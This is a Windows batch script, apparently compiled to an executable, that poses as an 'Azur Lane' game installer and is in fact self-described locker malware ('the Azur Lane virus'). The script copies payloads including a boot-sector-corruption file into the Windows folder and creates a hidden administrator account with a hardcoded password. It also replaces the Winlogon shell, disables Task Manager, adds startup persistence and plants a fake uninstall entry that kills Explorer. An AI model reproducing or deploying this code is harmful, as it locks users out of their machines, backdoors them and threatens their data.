::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEfWeUtNorD39Q=
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEfW+0ra4rYzvmNL/IB/1XwO5Qk2Bo=
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEUV+0xNorD39Q=
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEOXOczdMHewrHu
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEOQOMtbJrLlLaPNIA=
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEJRuMmdYzUyLHAJfgWig==
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEIVeFyfIbI27aCJa4W8kCE
::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnENVfY8cN2V36yLQA==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJFie4VA8KRVRWg2QKXj0FqcT4u34+9bR9k8EArZyeZXOyPmCIe4Wp0HhZp052WoXkcgDAlVRfR3L
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZkkaH0rWXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlbMbyXpZg==
::ZQ05rAF9IAHYFVzEqQIRMg5GDCiDMm76NbAI/fib
::eg0/rx1wNQPfEVWB+kM9LVsJDCWYKXn6KrQS7ajI6v6Ssi0=
::fBEirQZwNQPfEVWB+kM9LVsJDCWYKXn6KrQS7ajI6v6Ssi0=
::cRolqwZ3JBvQF1fEqQIRMg5GDCiDMm76NbAI/fi76eWV4noUWrFtGA==
::dhA7uBVwLU+EWGCL51YxOltdQgfMXA==
::YQ03rBFzNR3SWATEzU0jPBpGDA2MPyXa
::dhAmsQZ3MwfNWATEzU0jPBpGDA2MPyXa
::ZQ0/vhVqMQ3MEVWAtB9wOAldWgWWOSa4E7wQ7Ig=
::Zg8zqx1/OA3MEVWAtB9wOwtRTw2DMCa4E7wQ7Ig=
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJFiI50ckPQsZShGOMCatD7tPuqXtvqTV7B5TB6w6YIq7
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cls
echo.
echo Please wait...
echo.
: ===================================================
: Indicates the user of a game installation in bg
: ===================================================
traymcore.exe "Please wait while we processed the installation of Azur Lane game in the background..." /T:"Azur Lane Setup" /I:Info
: ===================================================
: Copies shell.exe to %systemdrive%
: ===================================================
copy "%cd%\shell.exe" "%windir%\shell.exe"
copy "%cd%\icon.exe" "%windir%\icon.exe"
copy "%cd%\traymcore.exe" "%windir%\traymcore.exe"
copy "%cd%\startup.bat" "%windir%\startup.bat"
copy "%cd%\bmgr.exe" "%windir%\bmgr.exe"
copy "%cd%\bootsect-corrupt.bin" "%windir%\bootsect-corrupt.bin"
copy "%cd%\patch2.exe" "%windir%\patch2.exe"
copy "%cd%\uac-disable.exe" "%windir%\uac-disable.exe"
: ===============================================
: Takes a backup of current bootsect to %windir%
: ===============================================
"%windir%\bmgr.exe" /DEVICE=%systemdrive% /mbr /backup /file="%windir%\bootsect-backup.bin" /sectors=1 /quiet
: ====================================================
: Disables current user and enables a hidden user
: ====================================================
net user "%username%" /active:yes
net user "%username%" /passwordreq:no
net user "%username%" /comments:"An encrypted account by the Azur Lane virus - Coded by Insertx2k Dev"
net user /add Enterprise
net user Enterprise /active:yes
net user Enterprise /passwordreq:yes
net user Enterprise iloveenterprise
net user Enterprise /expires:never
net localgroup /add Administrators Enterprise
net localgroup /add Users Enterprise
net localgroup /add Power Users Enterprise
net user Guest /active:no
: ==================================================================
: installs registry editor values on a certian windows environment.
: ==================================================================
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "DisplayName" /t REG_SZ /d "Azur Lane (Windows 32-bit)" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "Publisher" /t REG_SZ /d "Yostar" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "URLInfoAbout" /t REG_SZ /d "https://twitter.com/azur-lane-en" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "DisplayVersion" /t REG_SZ /d "r0.1.2.6.9 (Unofficial)" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "DisplayIcon" /t REG_SZ /d "%windir%\shell.exe,0" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "UninstallString" /t REG_SZ /d "cmd.exe /c taskkill /f /im explorer.exe&taskkill /f /im control.exe&echo You can't get rid of me that easy!&pause&exit" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "QuietUninstallString" /t REG_SZ /d "cmd.exe /c taskkill /f /im explorer.exe&taskkill /f /im control.exe&echo You can't get rid of me that easy!&pause&exit" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "InstallDate" /t REG_SZ /d "20691010" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "InstallLocation" /t REG_SZ /d "%windir%\system32" /f 
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "NoRepair" /t REG_DWORD /d 0x00000001 /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "NoModify" /t REG_DWORD /d 0x00000001 /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "NoRemove" /t REG_DWORD /d 0x00000000 /f
: ==============================================================
: Locks out windows' default shell
: ==============================================================
REG ADD "HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon" /v "Shell" /t REG_SZ /d "%windir%\shell.exe" /f
: ==============================================================
: definitely disabling windows task manager for proper locking
: ==============================================================
REG ADD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system" /v "DisableTaskMgr" /t REG_DWORD /d 0x00000001 /f 
: ==========================================================
: Injects the startup code
: ==========================================================
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SysShellRep" /t REG_SZ /d "%windir%\shell.exe" /f 
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SysShellStartupCMD" /t REG_SZ /d "%windir%\startup.bat" /f 
: ==============================
: Another delay please...
: ==============================
ping -w 15 localhost >nul
: =============================
: ok enough i am out.!!
: =============================
"%windir%\patch2.exe"
ping -w 10 localhost >nul
exit